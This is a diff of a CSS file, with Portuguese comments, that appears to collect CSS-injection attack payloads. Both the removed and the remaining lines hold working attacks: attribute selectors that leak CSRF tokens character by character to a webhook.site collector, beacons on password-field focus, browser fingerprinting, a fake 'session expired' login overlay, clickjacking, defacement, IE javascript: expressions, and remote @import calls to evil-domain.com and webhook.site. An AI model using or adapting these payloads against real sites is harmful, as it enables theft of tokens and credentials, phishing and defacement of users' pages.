@@ -1,39 +1,3 @@
-/* ===== ARQUIVO 1: basic-xss.css ===== */
-/* CSS para teste básico de injeção */
-
-/* Defacement simples */
-body {
-    background: red !important;
-    color: white !important;
-}
-
-/*
-body::before {
-    content: "SITE COMPROMETIDO VIA CSS INJECTION";
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background: black;
-    color: red;
-    padding: 20px;
-    font-size: 30px;
-    z-index: 99999;
-    border: 3px solid red;
-    font-family: monospace;
-}
-*/
-
-/* Oculta conteúdo original */
-/*
-#chat, .chat-container {
-    display: none !important;
-}
-*/
-
-/* ===== ARQUIVO 2: data-exfiltration.css ===== */
-/* CSS para exfiltração de dados */
-
 /* Roubo de tokens CSRF */
 input[name*="csrf"][value^="a"] { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/steal?csrf=a"); }
 input[name*="csrf"][value^="b"] { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/steal?csrf=b"); }
@@ -56,43 +20,6 @@ input:focus { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05
 button:hover { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/button-hover"); }
 a:hover { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/link-hover"); }
 
-/* ===== ARQUIVO 3: advanced-attacks.css ===== */
-/* CSS para ataques avançados */
-
-/* Clickjacking */
-body {
-    position: relative;
-}
-
-body::after {
-    content: "";
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: transparent;
-    z-index: 99999;
-    cursor: pointer;
-}
-
-/* Fake login overlay */
-body::before {
-    content: "Sua sessão expirou. Faça login novamente:";
-    position: fixed;
-    top: 20%;
-    left: 50%;
-    transform: translateX(-50%);
-    background: white;
-    border: 2px solid #ccc;
-    padding: 20px;
-    z-index: 99998;
-    font-family: Arial, sans-serif;
-    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-}
-
-/* Importa CSS externo adicional */
-@import url("https://evil-domain.com/additional-malicious.css");
 
 /* ===== ARQUIVO 4: browser-fingerprinting.css ===== */
 /* CSS para fingerprinting do browser */
@@ -129,7 +56,6 @@ body::before {
     body { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/fingerprint?orientation=landscape"); }
 }
 
-/* ===== ARQUIVO 5: keylogger.css ===== */
 /* CSS para captura de teclas (limitado) */
 
 /* Monitora foco em campos */
@@ -141,26 +67,6 @@ input[type="text"]:focus { background: url("https://webhook.site/8093de50-b3de-4
 input[type="email"]:focus { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/key?type=email"); }
 input[type="password"]:focus { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/key?type=password"); }
 
-/* ===== ARQUIVO 6: ie-specific.css ===== */
-/* CSS para Internet Explorer (ataques legados) */
-
-/* Execução de JavaScript no IE (versões antigas) */
-body {
-    behavior: url("javascript:alert('XSS via CSS behavior')");
-}
-
-/* Expression para IE */
-body {
-    width: expression(alert('CSS Expression XSS'));
-}
-
-/* Background com JavaScript */
-body {
-    background: url("javascript:alert('CSS JS Background')");
-}
-
-/* ===== ARQUIVO 7: timing-attacks.css ===== */
-/* CSS para timing attacks */
 
 /* Timing diferencial baseado em conteúdo */
 input[value^="admin"] {
@@ -187,70 +93,6 @@ input[value^="test"] {
     to { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/timing?user=test&time=3"); }
 }
 
-/* ===== ARQUIVO 8: unicode-attacks.css ===== */
-/* CSS para ataques com Unicode */
-
-/* Detecta emojis específicos */
-*[title*="😀"] { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/emoji?type=smile"); }
-*[title*="🔒"] { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/emoji?type=lock"); }
-*[title*="💰"] { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/emoji?type=money"); }
-
-/* Detecta caracteres especiais */
-*[value*="@"] { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/char?type=at"); }
-*[value*="$"] { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/char?type=dollar"); }
-*[value*="#"] { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/char?type=hash"); }
-
-/* ===== ARQUIVO 9: font-based-attacks.css ===== */
-/* CSS para ataques baseados em fontes */
-
-/* Carregamento de fonte maliciosa */
-@font-face {
-    font-family: 'EvilFont';
-    src: url('https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/font.woff?data=steal');
-}
-
-body {
-    font-family: 'EvilFont', sans-serif;
-}
-
-/* Font com exfiltração de dados */
-@font-face {
-    font-family: 'DataExfil';
-    src: url('https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/font?secret=' attr(data-secret));
-}
-
-[data-secret] {
-    font-family: 'DataExfil';
-}
-
-/* ===== ARQUIVO 10: comprehensive-test.css ===== */
-/* CSS abrangente para teste completo */
-
-/* Combina múltiplas técnicas */
-body {
-    background: red !important;
-    color: white !important;
-}
-
-/* Defacement */
-body::before {
-    content: "CSS INJECTION CONFIRMED - SITE COMPROMISED";
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100px;
-    background: linear-gradient(45deg, red, darkred);
-    color: white;
-    font-size: 24px;
-    font-weight: bold;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 99999;
-    box-shadow: 0 4px 8px rgba(0,0,0,0.5);
-}
-
 /* Data exfiltration */
 input { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/css-injection-confirmed"); }
 
@@ -262,7 +104,3 @@ input { background: url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c63
 /* Import externo */
 @import url("https://webhook.site/8093de50-b3de-4c42-8044-1d05bf4c6386/additional.css");
 
-/* Oculta conteúdo original */
-.chat-container, #chat {
-    opacity: 0.3 !important;
-}
